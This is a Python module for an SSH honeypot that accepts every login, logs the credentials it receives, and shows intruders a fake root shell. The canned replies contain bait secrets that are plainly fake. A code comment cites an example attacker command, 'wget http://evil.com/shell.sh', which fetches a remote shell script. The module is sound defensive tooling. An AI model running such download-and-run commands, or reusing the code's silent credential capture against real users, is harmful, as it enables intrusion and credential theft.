"""
mirrortrap/fake_services/ssh.py
────────────────────────────────
Pure-Python SSH honeypot powered by Paramiko.

Listens on a configurable port (default 2222) and:
  1. Accepts *any* username/password combination — logs every attempt.
  2. Presents a fake Ubuntu shell (bash prompt) to the attacker.
  3. Records every command typed in the session.
  4. Writes all events directly to the MirrorTrap SQLite DB via core.logger.
  5. Runs in a background daemon thread so Flask startup is not blocked.

Configuration (via .env / environment):
    SSH_HONEYPOT_PORT   = 2222      (port to listen on)
    SSH_HONEYPOT_HOST   = 0.0.0.0  (bind address)
    SSH_HOST_KEY_PATH   = <path>    (optional — auto-generated RSA key if absent)

Usage — called automatically from run.py when SSH_HONEYPOT_PORT is set:
    from mirrortrap.fake_services.ssh import start_ssh_honeypot
    start_ssh_honeypot(db_uri=app.config['DATABASE_URI'])
"""

from __future__ import annotations

import os
import socket
import threading
import uuid
import logging
import textwrap
import datetime
from pathlib import Path

log = logging.getLogger("mirrortrap.ssh_honeypot")

# ── Lazy import guard ─────────────────────────────────────────────────────────

try:
    import paramiko
    _PARAMIKO_AVAILABLE = True
except ImportError:
    _PARAMIKO_AVAILABLE = False

# ── Fake shell responses ──────────────────────────────────────────────────────

_BANNER = (
    "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n"
    "\r\n"
    " * Documentation:  https://help.ubuntu.com\r\n"
    " * Management:     https://landscape.canonical.com\r\n"
    " * Support:        https://ubuntu.com/advantage\r\n"
    "\r\n"
    "Last login: {login_time} from {src_ip}\r\n"
    "\r\n"
)

_PROMPT = "{username}@prod-server-01:~$ "

# Realistic fake responses for common attacker commands
_CMD_RESPONSES: dict[str, str] = {
    "id":               "uid=0(root) gid=0(root) groups=0(root)\r\n",
    "whoami":           "root\r\n",
    "uname -a":         "Linux prod-server-01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\r\n",
    "uname":            "Linux\r\n",
    "hostname":         "prod-server-01\r\n",
    "pwd":              "/root\r\n",
    "ls":               "anaconda3  .bash_history  .bashrc  deploy.sh  .env  secrets.txt  server.log\r\n",
    "ls -la":           "total 64\r\ndrwx------ 6 root root 4096 Jan 15 09:23 .\r\ndrwxr-xr-x 19 root root 4096 Jan 10 08:00 ..\r\n-rw------- 1 root root 3842 Jan 15 09:21 .bash_history\r\n-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc\r\n-rwxr-xr-x 1 root root 1823 Jan 14 17:05 deploy.sh\r\n-rw------- 1 root root  512 Jan 12 11:34 .env\r\n-rw------- 1 root root  198 Jan 13 09:01 secrets.txt\r\n-rw-r--r-- 1 root root 8912 Jan 15 09:23 server.log\r\n",
    "ls -l":            "total 48\r\n-rwxr-xr-x 1 root root 1823 Jan 14 17:05 deploy.sh\r\n-rw------- 1 root root  512 Jan 12 11:34 .env\r\n-rw------- 1 root root  198 Jan 13 09:01 secrets.txt\r\n-rw-r--r-- 1 root root 8912 Jan 15 09:23 server.log\r\n",
    "cat .env":         "DATABASE_URL=postgres://admin:Sup3rS3cr3t!@db.internal:5432/proddb\r\nSECRET_KEY=8f21a3c9e0b7d54f\r\nAWS_ACCESS_KEY_ID=AKIA4BFAKE000EXAMPLE\r\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKEKEY\r\nSTRIPE_SECRET_KEY=sk_live_FAKEKEY12345ABCEF\r\n",
    "cat secrets.txt":  "[AWS]\r\naccess_key = AKIA4BFAKE000EXAMPLE\r\nsecret_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKEKEY\r\nregion = us-east-1\r\n",
    "cat deploy.sh":    "#!/bin/bash\r\n# Deployment script — do not share\r\nexport DB_PASS='Sup3rS3cr3t!'\r\nrsync -avz ./app/ deploy@10.0.0.5:/var/www/app/\r\n",
    "ps aux":           "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\nroot         1  0.0  0.1  19356  1544 ?        Ss   Jan10   0:01 /sbin/init\r\nroot       982  0.0  0.4 269320 18204 ?        Ssl  Jan10   2:18 /usr/bin/python3 /opt/app/server.py\r\nroot      1204  0.0  0.1  14680  2060 pts/0    Ss   09:22   0:00 -bash\r\n",
    "netstat -an":      "Active Internet connections (servers and established)\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State\r\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\r\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\r\ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN\r\ntcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN\r\n",
    "ifconfig":         "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 10.0.1.42  netmask 255.255.255.0  broadcast 10.0.1.255\r\n        ether 02:42:0a:00:01:2a  txqueuelen 0  (Ethernet)\r\n",
    "ip a":             "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\r\n    link/ether 02:42:0a:00:01:2a brd ff:ff:ff:ff:ff:ff\r\n    inet 10.0.1.42/24 brd 10.0.1.255 scope global eth0\r\n",
    "env":              "USER=root\r\nHOME=/root\r\nSHELL=/bin/bash\r\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nDATABASE_URL=postgres://admin:Sup3rS3cr3t!@db.internal:5432/proddb\r\nAWS_ACCESS_KEY_ID=AKIA4BFAKE000EXAMPLE\r\n",
    "history":          "    1  ssh root@10.0.1.42\r\n    2  ls -la\r\n    3  cat .env\r\n    4  cat secrets.txt\r\n    5  python3 backdoor.py\r\n",
    "w":                " 09:23:01 up 5 days,  1:23,  1 user,  load average: 0.01, 0.01, 0.00\r\nUSER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\r\nroot     pts/0    {src_ip}         09:22    0.00s  0.01s  0.00s w\r\n",
    "who":              "root     pts/0        2024-01-15 09:22 ({src_ip})\r\n",
    "last":             "root     pts/0        {src_ip}       Mon Jan 15 09:22   still logged in\r\nroot     pts/0        203.0.113.47     Sun Jan 14 22:01 - 22:07  (00:06)\r\n",
    "df -h":            "Filesystem      Size  Used Avail Use% Mounted on\r\n/dev/sda1        50G   18G   30G  38% /\r\ntmpfs           7.8G     0  7.8G   0% /dev/shm\r\n",
    "free -h":          "              total        used        free      shared  buff/cache   available\r\nMem:           15Gi       3.2Gi       8.9Gi       128Mi       2.9Gi        12Gi\r\nSwap:           0Bi         0Bi         0Bi\r\n",
    "uptime":           " 09:23:01 up 5 days,  1:23,  1 user,  load average: 0.01, 0.01, 0.00\r\n",
    "date":             "Mon Jan 15 09:23:01 UTC 2024\r\n",
    "which python3":    "/usr/bin/python3\r\n",
    "which python":     "/usr/bin/python\r\n",
    "python3 --version":"Python 3.10.12\r\n",
    "wget":             "wget: missing URL\r\nUsage: wget [OPTION]... [URL]...\r\n",
    "curl":             "curl: try 'curl --help' for more information\r\n",
    "exit":             "__EXIT__",
    "logout":           "__EXIT__",
    "quit":             "__EXIT__",
}

_DEFAULT_RESPONSE = "bash: {cmd}: command not found\r\n"


def _get_response(cmd: str, src_ip: str, username: str) -> tuple[str, bool]:
    """
    Return (response_text, should_exit) for a given command string.
    Handles prefix matching for commands like 'cat <file>' and dynamic templates.
    """
    cmd_stripped = cmd.strip()
    cmd_lower = cmd_stripped.lower()

    # Exact match first
    if cmd_stripped in _CMD_RESPONSES:
        resp = _CMD_RESPONSES[cmd_stripped]
    elif cmd_lower in _CMD_RESPONSES:
        resp = _CMD_RESPONSES[cmd_lower]
    else:
        # Prefix scan (e.g. "wget http://evil.com/shell.sh")
        resp = None
        for key, val in _CMD_RESPONSES.items():
            if cmd_lower.startswith(key.lower()) or cmd_stripped.startswith(key):
                resp = val
                break

    if resp is None:
        # Try bare command name (first word) for things like "ls /etc"
        first_word = cmd_stripped.split()[0] if cmd_stripped else ''
        resp = _CMD_RESPONSES.get(first_word, _DEFAULT_RESPONSE.format(cmd=first_word or cmd_stripped))

    should_exit = (resp == "__EXIT__")
    if should_exit:
        resp = ""

    # Fill in dynamic placeholders
    resp = resp.replace("{src_ip}", src_ip).replace("{username}", username)
    return resp, should_exit


# ── RSA host key helper ───────────────────────────────────────────────────────

def _load_or_generate_host_key(key_path: str | None) -> "paramiko.RSAKey":
    """Load an existing RSA host key or generate + save a new one."""
    if key_path and Path(key_path).exists():
        return paramiko.RSAKey(filename=key_path)

    # Auto-generate
    key = paramiko.RSAKey.generate(2048)
    if key_path:
        Path(key_path).parent.mkdir(parents=True, exist_ok=True)
        key.write_private_key_file(key_path)
        log.info(f"[SSH Honeypot] Generated new RSA host key → {key_path}")
    else:
        log.info("[SSH Honeypot] Using ephemeral RSA host key (set SSH_HOST_KEY_PATH to persist)")

    return key


# ── Paramiko server interface ─────────────────────────────────────────────────

class _HoneypotServer(paramiko.ServerInterface):  # type: ignore[misc]
    """
    Paramiko SSH server that accepts every login attempt and logs credentials.
    """

    def __init__(self, src_ip: str, db_uri: str):
        self.src_ip = src_ip
        self.db_uri = db_uri
        self.username: str = "unknown"
        self.password: str = ""
        self.session_id: str = str(uuid.uuid4())
        self.auth_event = threading.Event()

    # Allow only password auth (most brute-force bots use password)
    def get_allowed_auths(self, username: str) -> str:
        return "password"

    def check_auth_password(self, username: str, password: str) -> int:
        self.username = username
        self.password = password
        log.info(f"[SSH Honeypot] Login attempt from {self.src_ip} — {username}:{password}")

        from mirrortrap.core.logger import upsert_session, log_attack
        # Record as a session
        upsert_session(
            session_id=self.session_id,
            source_ip=self.src_ip,
            username=username,
            password=password,
            success=True,   # Honeypot always "grants" access
            db_uri=self.db_uri,
        )
        # Also log as a brute-force attack event
        log_attack(
            source_ip=self.src_ip,
            service="SSH_Honeypot",
            attack_type="ssh_brute_force",
            payload={"username": username, "password": password, "session_id": self.session_id},
            db_uri=self.db_uri,
        )
        self.auth_event.set()
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel: "paramiko.Channel") -> bool:
        return True

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ) -> bool:
        return True

    def check_channel_exec_request(self, channel: "paramiko.Channel", command: bytes) -> bool:
        """Handle non-interactive exec sessions (e.g. 'ssh host cat /etc/passwd')."""
        cmd = command.decode("utf-8", errors="replace").strip()
        self._log_and_respond_exec(channel, cmd)
        return True

    def _log_and_respond_exec(self, channel: "paramiko.Channel", cmd: str):
        from mirrortrap.core.logger import log_command
        log_command(
            session_id=self.session_id,
            command=cmd,
            output="exec_mode",
            db_uri=self.db_uri,
        )
        resp, _ = _get_response(cmd, self.src_ip, self.username)
        channel.sendall(resp.encode("utf-8", errors="replace"))
        channel.send_exit_status(0)
        channel.close()


# ── Interactive session handler ───────────────────────────────────────────────

def _handle_session(client_sock: socket.socket, src_ip: str, db_uri: str):
    """
    Handle a single SSH client connection in its own thread.
    Presents a fake interactive shell and logs every command.
    """
    if not _PARAMIKO_AVAILABLE:
        client_sock.close()
        return

    transport = None
    try:
        transport = paramiko.Transport(client_sock)
        transport.local_version = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"

        host_key_path = os.getenv("SSH_HOST_KEY_PATH")
        host_key = _load_or_generate_host_key(host_key_path)
        transport.add_server_key(host_key)

        server = _HoneypotServer(src_ip=src_ip, db_uri=db_uri)
        transport.start_server(server=server)

        # Wait for a channel to open (timeout 20 s)
        channel = transport.accept(20)
        if channel is None:
            log.debug(f"[SSH Honeypot] No channel opened from {src_ip}")
            return

        # Wait for auth to complete
        server.auth_event.wait(10)

        # Build banner with timestamps
        login_time = datetime.datetime.utcnow().strftime("%a %b %d %H:%M:%S %Y")
        banner = _BANNER.format(login_time=login_time, src_ip=src_ip)
        channel.sendall(banner.encode())

        prompt = _PROMPT.format(username=server.username)
        channel.sendall(prompt.encode())

        buf = ""
        from mirrortrap.core.logger import log_command

        while True:
            # Read one byte at a time (typical interactive SSH)
            try:
                data = channel.recv(1)
            except Exception:
                break

            if not data:
                break

            ch = data.decode("utf-8", errors="replace")

            if ch in ("\r", "\n"):
                # Echo newline
                channel.sendall(b"\r\n")
                cmd = buf.strip()
                buf = ""

                if cmd:
                    log.info(f"[SSH Honeypot] {src_ip} ({server.username}) $ {cmd}")
                    log_command(
                        session_id=server.session_id,
                        command=cmd,
                        output=None,
                        db_uri=db_uri,
                    )
                    resp, should_exit = _get_response(cmd, src_ip, server.username)
                    if resp:
                        channel.sendall(resp.encode("utf-8", errors="replace"))
                    if should_exit:
                        break

                channel.sendall(prompt.encode())

            elif ch in ("\x7f", "\x08"):
                # Backspace
                if buf:
                    buf = buf[:-1]
                    channel.sendall(b"\x08 \x08")
            elif ch == "\x03":
                # Ctrl-C
                channel.sendall(b"^C\r\n")
                channel.sendall(prompt.encode())
                buf = ""
            elif ch == "\x04" and not buf:
                # Ctrl-D on empty line → logout
                break
            else:
                buf += ch
                channel.sendall(data)  # Echo

    except Exception as exc:
        log.debug(f"[SSH Honeypot] Session error from {src_ip}: {exc}")
    finally:
        try:
            if transport:
                transport.close()
        except Exception:
            pass
        try:
            client_sock.close()
        except Exception:
            pass


# ── TCP listener ──────────────────────────────────────────────────────────────

def _listener_loop(host: str, port: int, db_uri: str):
    """Main accept loop — runs forever in a daemon thread."""
    srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv_sock.bind((host, port))
    except OSError as e:
        log.error(f"[SSH Honeypot] Cannot bind {host}:{port} — {e}")
        return

    srv_sock.listen(50)
    log.info(f"[SSH Honeypot] 🍯 Listening on {host}:{port}")

    while True:
        try:
            client_sock, addr = srv_sock.accept()
            src_ip = addr[0]
            log.info(f"[SSH Honeypot] Connection from {src_ip}:{addr[1]}")
            t = threading.Thread(
                target=_handle_session,
                args=(client_sock, src_ip, db_uri),
                daemon=True,
            )
            t.start()
        except Exception as exc:
            log.warning(f"[SSH Honeypot] Accept error: {exc}")


# ── Public API ────────────────────────────────────────────────────────────────

def start_ssh_honeypot(db_uri: str = "mirrortrap.db") -> bool:
    """
    Start the SSH honeypot in a background daemon thread.

    Returns True if started successfully, False if paramiko is unavailable
    or the port is disabled (SSH_HONEYPOT_PORT=0).

    Call this once from run.py after the Flask app is configured.
    """
    if not _PARAMIKO_AVAILABLE:
        log.warning(
            "[SSH Honeypot] paramiko is not installed. "
            "Run: pip install paramiko  — SSH honeypot disabled."
        )
        return False

    port_str = os.getenv("SSH_HONEYPOT_PORT", "2222")
    try:
        port = int(port_str)
    except ValueError:
        log.warning(f"[SSH Honeypot] Invalid SSH_HONEYPOT_PORT='{port_str}' — skipping.")
        return False

    if port == 0:
        log.info("[SSH Honeypot] SSH_HONEYPOT_PORT=0 — SSH honeypot disabled.")
        return False

    host = os.getenv("SSH_HONEYPOT_HOST", "0.0.0.0")

    thread = threading.Thread(
        target=_listener_loop,
        args=(host, port, db_uri),
        daemon=True,
        name="ssh-honeypot",
    )
    thread.start()
    return True
